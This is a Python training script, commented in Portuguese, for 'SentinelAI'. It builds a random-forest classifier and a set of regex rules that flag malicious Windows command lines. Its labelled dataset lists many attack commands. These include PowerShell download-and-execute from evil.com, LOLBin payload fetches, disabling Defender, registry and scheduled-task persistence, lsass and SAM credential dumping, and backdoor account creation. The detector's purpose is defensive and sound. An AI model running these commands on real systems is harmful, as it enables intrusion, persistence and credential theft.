# train.py - Treino do Modelo de Classificação
# SentinelAI - Motor de Análise Comportamental
import os
import joblib
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import CountVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report

# --- Configuração ---
MODELS_DIR = "models"
MODEL_PATH = os.path.join(MODELS_DIR, "security_model.pkl")
VECTORIZER_PATH = os.path.join(MODELS_DIR, "vectorizer.pkl")

# --- Dados de treino ---
# Formato: (command_line, label)  →  1 = Malicioso, 0 = Normal
TRAINING_DATA = [
    # === MALICIOSOS ===

    # PowerShell suspeito / ofuscado
    ("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATg==", 1),
    ("powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=", 1),
    ("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')", 1),
    ("powershell -ExecutionPolicy Bypass -File C:\\temp\\malware.ps1", 1),
    ("powershell -noprofile -noninteractive -enc SQBFAFgA", 1),
    ("powershell -w hidden -nop -ep bypass -c \"IEX((new-object net.webclient).downloadstring('http://10.0.0.1/run.ps1'))\"", 1),
    ("powershell.exe -exec bypass -noexit -c Set-MpPreference -DisableRealtimeMonitoring $true", 1),
    ("powershell -command \"[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')\"", 1),
    ("powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQA=", 1),
    ("powershell -nop -sta -w 1 -enc  WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdAA==", 1),

    # LOLBins
    ("certutil.exe -urlcache -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe", 1),
    ("certutil -decode C:\\temp\\encoded.txt C:\\temp\\payload.exe", 1),
    ("mshta.exe http://evil.com/payload.hta", 1),
    ("mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"powershell -nop -w hidden\"\")(window.close)\")", 1),
    ("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()", 1),
    ("rundll32.exe shell32.dll,ShellExec_RunDLL C:\\malware.exe", 1),
    ("regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll", 1),
    ("wscript.exe C:\\Users\\Public\\malware.vbs", 1),
    ("cscript.exe //E:jscript C:\\Windows\\Temp\\payload.js", 1),
    ("msiexec /q /i http://evil.com/malware.msi", 1),
    ("bitsadmin /transfer job /download /priority high http://evil.com/a.exe C:\\temp\\a.exe", 1),

    # Persistência
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d C:\\malware.exe", 1),
    ("reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /d C:\\malware.exe", 1),
    ("schtasks /create /tn backdoor /tr C:\\malware.exe /sc onlogon /ru SYSTEM", 1),
    ("schtasks /create /sc minute /mo 5 /tn updater /tr C:\\Windows\\Temp\\payload.exe", 1),
    ("sc create malservice binpath= C:\\malware.exe start= auto", 1),

    # Movimento lateral
    ("wmic /node:192.168.1.50 process call create cmd.exe", 1),
    ("psexec.exe \\\\192.168.1.10 -u admin -p pass cmd.exe", 1),
    ("net use \\\\192.168.1.5\\IPC$ password /user:domain\\admin", 1),

    # Dump de credenciais
    ("mimikatz.exe sekurlsa::logonpasswords", 1),
    ("procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp", 1),
    ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full", 1),
    ("reg save HKLM\\SAM C:\\temp\\sam.hive", 1),

    # Adição de utilizadores
    ("net user admin Password123! /add", 1),
    ("net localgroup administrators hacker /add", 1),
    ("net user backdoor P@ssw0rd /add /domain", 1),

    # Download de payloads
    ("curl http://evil.com/shell.exe -o C:\\temp\\shell.exe", 1),
    ("wget http://10.0.0.99/payload -OutFile C:\\Windows\\Temp\\p.exe", 1),
    ("cmd.exe /c start /b C:\\Windows\\Temp\\payload.exe", 1),

    # === NORMAIS ===

    # Comandos de sistema básicos
    ("whoami", 0),
    ("hostname", 0),
    ("cls", 0),
    ("echo hello world", 0),
    ("date /t", 0),
    ("time /t", 0),
    ("ver", 0),

    # Navegação e ficheiros
    ("dir C:\\Users\\Admin\\Documents", 0),
    ("dir C:\\Windows\\System32", 0),
    ("cd C:\\Users\\Admin\\Desktop", 0),
    ("mkdir C:\\Projects\\new_folder", 0),
    ("copy C:\\file.txt D:\\backup\\file.txt", 0),
    ("del C:\\temp\\old_file.txt", 0),
    ("type C:\\Users\\readme.txt", 0),

    # Rede legítima
    ("ipconfig /all", 0),
    ("ping google.com", 0),
    ("ping 8.8.8.8 -n 4", 0),
    ("nslookup google.com", 0),
    ("netstat -an", 0),
    ("tracert google.com", 0),

    # Processos e sistema
    ("tasklist", 0),
    ("taskkill /IM notepad.exe /F", 0),
    ("systeminfo", 0),
    ("sc query", 0),
    ("net start", 0),

    # Aplicações normais
    ("notepad.exe", 0),
    ("explorer.exe", 0),
    ("calc.exe", 0),
    ("mspaint.exe", 0),
    ("chrome.exe", 0),
    ("firefox.exe", 0),
    ("winword.exe", 0),
    ("excel.exe C:\\reports\\q1.xlsx", 0),

    # Desenvolvimento
    ("python.exe script.py", 0),
    ("python -m pip install requests", 0),
    ("git commit -m 'fix bug'", 0),
    ("git pull origin main", 0),
    ("git status", 0),
    ("code .", 0),
    ("npm install", 0),
    ("mvn clean install", 0),

    # PowerShell legítimo
    ("powershell Get-Process", 0),
    ("powershell Get-Service", 0),
    ("powershell -command Get-Date", 0),
    ("powershell Get-ChildItem C:\\Users", 0),
    ("powershell Set-Location C:\\Projects", 0),
    ("powershell Write-Host 'Hello'", 0),
    ("powershell Get-EventLog -LogName System -Newest 10", 0),
]

def load_training_data():
    commands = [item[0] for item in TRAINING_DATA]
    labels   = [item[1] for item in TRAINING_DATA]
    return commands, labels

def extract_features(commands):
    """Features manuais para detetar padrões suspeitos."""
    import re
    import numpy as np

    features = []
    for cmd in commands:
        cmd_lower = cmd.lower()
        f = [
            len(cmd),                                                        # comprimento total
            cmd.count(' '),                                                  # nº de argumentos
            1 if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', cmd) else 0,      # base64 longo
            1 if '-enc' in cmd_lower or '-encodedcommand' in cmd_lower else 0,  # encoded flag
            1 if '-nop' in cmd_lower or '-noprofile' in cmd_lower else 0,   # noprofile
            1 if '-w hidden' in cmd_lower or '-windowstyle h' in cmd_lower else 0,  # hidden
            1 if '-exec bypass' in cmd_lower or '-executionpolicy bypass' in cmd_lower else 0,
            1 if 'iex' in cmd_lower or 'invoke-expression' in cmd_lower else 0,
            1 if 'downloadstring' in cmd_lower or 'webclient' in cmd_lower else 0,
            1 if 'http://' in cmd_lower or 'https://' in cmd_lower else 0,
            1 if any(lolbin in cmd_lower for lolbin in ['certutil', 'mshta', 'rundll32', 'regsvr32', 'wscript', 'cscript', 'bitsadmin', 'msiexec']) else 0,
            1 if any(x in cmd_lower for x in ['mimikatz', 'procdump', 'lsass', 'sekurlsa']) else 0,
            1 if 'net user' in cmd_lower and '/add' in cmd_lower else 0,
            1 if 'schtasks' in cmd_lower and '/create' in cmd_lower else 0,
            1 if 'currentversion\\run' in cmd_lower else 0,
        ]
        features.append(f)
    return np.array(features)

def train_model(commands, labels):
    import numpy as np
    from scipy.sparse import hstack

    print("[*] A vetorizar comandos...")
    vectorizer = CountVectorizer(
        analyzer='char_wb',
        ngram_range=(2, 4),
        max_features=5000
    )
    X_text = vectorizer.fit_transform(commands)

    print("[*] A extrair features manuais...")
    X_manual = extract_features(commands)

    # Combinar texto vetorizado + features manuais
    from scipy.sparse import csr_matrix
    X = hstack([X_text, csr_matrix(X_manual)])

    print("[*] A dividir dataset (80% treino / 20% teste)...")
    X_train, X_test, y_train, y_test = train_test_split(
        X, labels, test_size=0.2, random_state=42, stratify=labels
    )

    print("[*] A treinar RandomForestClassifier...")
    clf = RandomForestClassifier(
        n_estimators=200,
        random_state=42,
        class_weight='balanced'
    )
    clf.fit(X_train, y_train)

    print("\n--- Avaliação do Modelo ---")
    y_pred = clf.predict(X_test)
    print(classification_report(y_test, y_pred, target_names=["Normal", "Malicioso"]))

    return clf, vectorizer

def save_model(clf, vectorizer):
    os.makedirs(MODELS_DIR, exist_ok=True)
    joblib.dump(clf, MODEL_PATH)
    joblib.dump(vectorizer, VECTORIZER_PATH)
    print(f"[+] Modelo guardado em: {MODEL_PATH}")
    print(f"[+] Vetorizador guardado em: {VECTORIZER_PATH}")

HARD_RULES = [
    # (padrão regex, razão)
    (r'-enc(odedcommand)?\s+[A-Za-z0-9+/]{8,}', "PowerShell EncodedCommand"),
    (r'-w(indowstyle)?\s+hid(den)?', "PowerShell Hidden Window"),
    (r'iex\s*\(', "Invoke-Expression"),
    (r'downloadstring\s*\(', "WebClient DownloadString"),
    (r'certutil.*-urlcache.*http', "Certutil Download"),
    (r'mshta\s+http', "MSHTA Remote Payload"),
    (r'regsvr32.*/i:http', "Regsvr32 Remote SCT"),
    (r'bitsadmin.*/transfer', "BITSAdmin Download"),
    (r'net\s+user\s+\S+\s+\S+\s+/add', "Net User Add"),
    (r'schtasks.*/create.*(/ru\s+system|/sc\s+on)', "Scheduled Task Persistence"),
    (r'currentversion\\run', "Registry Run Key Persistence"),
    (r'mimikatz|sekurlsa|lsass\.dmp', "Credential Dumping"),
]

def check_hard_rules(command_line):
    import re
    cmd_lower = command_line.lower()
    for pattern, reason in HARD_RULES:
        if re.search(pattern, cmd_lower):
            return True, reason
    return False, None

def predict(command_line):
    """Classifica um command line — usa o modelo treinado."""
    from scipy.sparse import hstack, csr_matrix

    # 1. Verificar regras de alta certeza primeiro
    is_malicious, reason = check_hard_rules(command_line)
    if is_malicious:
        return {
            "command": command_line,
            "label": "MALICIOSO",
            "confidence": 99.0,
            "reason": reason
        }

    # 2. Modelo ML para os restantes
    clf        = joblib.load(MODEL_PATH)
    vectorizer = joblib.load(VECTORIZER_PATH)
    X_text     = vectorizer.transform([command_line])
    X_manual   = csr_matrix(extract_features([command_line]))
    X          = hstack([X_text, X_manual])
    prediction  = clf.predict(X)[0]
    probability = clf.predict_proba(X)[0]
    return {
        "command": command_line,
        "label": "MALICIOSO" if prediction == 1 else "NORMAL",
        "confidence": round(max(probability) * 100, 2),
        "reason": "ML Model"
    }

def main():
    print("=== [ SentinelAI ] Treino do Modelo ===\n")

    commands, labels = load_training_data()
    print(f"[*] Dataset: {len(commands)} amostras ({labels.count(1)} maliciosas, {labels.count(0)} normais)")

    clf, vectorizer = train_model(commands, labels)
    save_model(clf, vectorizer)

    # Teste rápido
    print("\n--- Teste Rápido ---")
    test_commands = [
        "powershell -nop -enc JABzAD0ATg==",
        "certutil.exe -urlcache -f http://evil.com/a.exe",
        "notepad.exe",
        "dir C:\\Users"
    ]
    for cmd in test_commands:
        result = predict(cmd)
        icon = "🔴" if result["label"] == "MALICIOSO" else "🟢"
        print(f"  {icon} [{result['label']}] ({result['confidence']}%) [{result['reason']}] → {result['command'][:60]}")

    print("\n[+] Treino concluído com sucesso!")

if __name__ == "__main__":
    main()